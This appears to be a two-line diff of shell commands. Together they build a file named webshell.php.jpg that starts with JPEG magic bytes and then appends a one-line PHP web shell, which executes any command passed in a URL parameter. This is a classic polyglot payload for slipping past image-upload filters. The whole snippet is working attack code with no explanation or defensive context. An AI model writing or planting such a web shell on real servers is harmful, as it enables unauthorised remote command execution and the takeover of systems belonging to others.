@@ -1,1 +1,2 @@
 echo 'FFD8FFDB' | xxd -r -p > webshell.php.jpg
+echo '<?=`$_GET[0]`?>' >> webshell.php.jpg
